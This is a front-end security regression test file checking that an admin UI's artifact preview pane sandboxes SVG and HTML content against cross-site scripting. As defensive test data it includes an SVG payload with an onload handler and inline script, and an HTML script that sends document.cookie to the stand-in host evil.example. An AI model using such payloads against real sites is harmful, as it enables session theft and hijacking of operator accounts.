/**
 * Security regression tests for the artifact preview pane.
 *
 * Artifacts are model output (or worse — model-summarised attacker
 * content from tools like `web_fetch`). The panel renders them in the
 * admin-UI origin where the operator's `corlinman_session` cookie lives,
 * so any HTML/SVG that escapes the sandbox can drive arbitrary admin
 * API calls as the operator.
 *
 * See R1-004 (SEC-002 + SEC-003).
 */

import { describe, expect, it, vi, afterEach } from "vitest";
import { render, screen } from "@testing-library/react";

import { ArtifactPanel } from "@/components/chat/artifact-panel";
import type { Artifact } from "@/lib/chat/artifacts";

function mk(overrides: Partial<Artifact> = {}): Artifact {
  return {
    id: "art_1",
    kind: "code",
    title: "untitled",
    language: "txt",
    source: "",
    messageId: "msg_1",
    ...overrides,
  };
}

declare global {
  // eslint-disable-next-line no-var
  var __pwned: boolean | undefined;
}

afterEach(() => {
  delete (globalThis as { __pwned?: boolean }).__pwned;
});

describe("ArtifactPanel — XSS hardening (R1-004)", () => {
  it("SEC-002: SVG artifact must NOT execute inline scripts or event handlers in the parent origin", () => {
    const payload = `<svg xmlns="http://www.w3.org/2000/svg" onload="globalThis.__pwned = true"><script>globalThis.__pwned = true;</script></svg>`;

    render(
      <ArtifactPanel
        artifacts={[mk({ id: "s", kind: "svg", language: "svg", source: payload })]}
        activeId="s"
        open={true}
        onClose={vi.fn()}
        onSelect={vi.fn()}
        onRemove={vi.fn()}
      />,
    );

    // The XSS payload must not have fired in the parent document.
    expect((globalThis as { __pwned?: boolean }).__pwned).toBeUndefined();

    // No raw <script> tag should be sitting in the parent DOM either.
    // (Inline-injected <script>...</script> wouldn't execute via innerHTML in
    // every engine, but its presence still represents a sandbox-escape risk
    // — e.g. a follow-up sanitiser change that adds a <script> rehoming
    // step.)
    const inlineScripts = document.querySelectorAll(
      '[data-testid="artifact-panel"] script',
    );
    expect(inlineScripts.length).toBe(0);

    // And SVG event-handler attributes (onload, onerror, …) must not be
    // present in the parent DOM — they would execute the moment the SVG
    // is reparented or re-rendered by React.
    const svgInParent = document.querySelector(
      '[data-testid="artifact-panel"] svg',
    );
    expect(svgInParent?.hasAttribute("onload")).toBeFalsy();
  });

  it("SEC-003: HTML artifact iframe sandbox must not combine allow-scripts with allow-same-origin", () => {
    render(
      <ArtifactPanel
        artifacts={[
          mk({
            id: "h",
            kind: "html",
            language: "html",
            source: `<script>top.location.href = 'https://evil.example/' + document.cookie;</script>`,
          }),
        ]}
        activeId="h"
        open={true}
        onClose={vi.fn()}
        onSelect={vi.fn()}
        onRemove={vi.fn()}
      />,
    );

    const iframe = screen.getByTestId("artifact-iframe-html") as HTMLIFrameElement;
    const sandbox = iframe.getAttribute("sandbox") ?? "";
    const tokens = sandbox.split(/\s+/).filter(Boolean);

    const hasScripts = tokens.includes("allow-scripts");
    const hasSameOrigin = tokens.includes("allow-same-origin");

    // The dangerous combination — together these neutralise the sandbox
    // for the parent's origin (the iframe can read parent cookies, hit
    // /api endpoints with the session cookie, etc.).
    expect(hasScripts && hasSameOrigin).toBe(false);

    // We should also be denying the loosest other escape hatches.
    expect(tokens).not.toContain("allow-top-navigation");
    expect(tokens).not.toContain("allow-popups-to-escape-sandbox");
  });

  it("SEC-002 (defence in depth): SVG preview route must also be sandboxed when scripts could be present", () => {
    // The SVG preview should not rely on dangerouslySetInnerHTML —
    // it should be carried into an iframe whose sandbox matches the
    // HTML branch's sandbox policy.
    render(
      <ArtifactPanel
        artifacts={[
          mk({
            id: "s2",
            kind: "svg",
            language: "svg",
            source: `<svg xmlns="http://www.w3.org/2000/svg"><circle r="10"/></svg>`,
          }),
        ]}
        activeId="s2"
        open={true}
        onClose={vi.fn()}
        onSelect={vi.fn()}
        onRemove={vi.fn()}
      />,
    );

    const svgIframe = screen.queryByTestId("artifact-iframe-svg") as
      | HTMLIFrameElement
      | null;
    expect(svgIframe).not.toBeNull();
    const sandbox = svgIframe!.getAttribute("sandbox");
    // The SVG branch shouldn't grant same-origin either.
    expect(sandbox).not.toBeNull();
    const tokens = (sandbox ?? "").split(/\s+/).filter(Boolean);
    expect(tokens).not.toContain("allow-same-origin");
  });
});
